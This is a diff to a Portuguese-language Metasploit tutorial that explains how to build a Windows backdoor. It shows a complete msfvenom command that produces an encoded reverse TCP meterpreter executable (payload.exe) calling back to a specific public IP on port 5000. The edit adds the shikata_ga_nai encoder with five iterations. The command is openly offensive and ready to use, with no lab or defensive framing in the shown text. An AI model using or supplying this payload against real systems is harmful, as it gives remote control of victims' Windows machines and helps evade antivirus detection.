@@ -42,7 +42,7 @@ Como vai ser a primeira execução o **METASPLOIT** vai perguntar se você desej
 
 ![](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSCSVqEzi43NukYA2E1HUfNSnztdZxoeFKaTczSbokL40tqbRL9)
 
-Agora vamos criar o nosso backdoor definindo qual tipo de conexão iremos usar, que vai ser uma **REVERSA TCP** para qual tipo de SO alvo, que será máquinas Windows, o nosso **LHOST**(IP de comunicação) que vai ser o nosso IP estático, nossa **LPORT**(porta de comunicação) a porta TCP, o tipo da extensão do backdoor **-f exe**, que são executáveis do windows, o algoritmo de criptografia e compreensão, **-i** o numero de interações do encoded com o backdoor, e **-o** o nosso arquivo de saída.  Se você estive em uma cloud provavelmente vai ter que *criar uma regra de firewall* para a sua porta escolhida
+Agora vamos criar o nosso backdoor definindo qual tipo de conexão iremos usar, que vai ser uma **REVERSA TCP** para qual tipo de SO alvo, que será máquinas Windows, o nosso **LHOST**(IP de comunicação) que vai ser o nosso IP estático, nossa **LPORT**(porta de comunicação) a porta TCP, o tipo da extensão do backdoor **-f exe**, que são executáveis do windows, o algoritmo de criptografia e compreensão **-e x86/shikata_ga_nai**, **-i 5** o numero de interações do encoded com o backdoor, e **-o** o nosso arquivo de saída.  Se você estive em uma cloud provavelmente vai ter que *criar uma regra de firewall* para a sua porta escolhida
 
  ```shell
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=34.97.212.80 LPORT=5000 -f exe -e x86/shikata_ga_nai -i 5 -o payload.exe
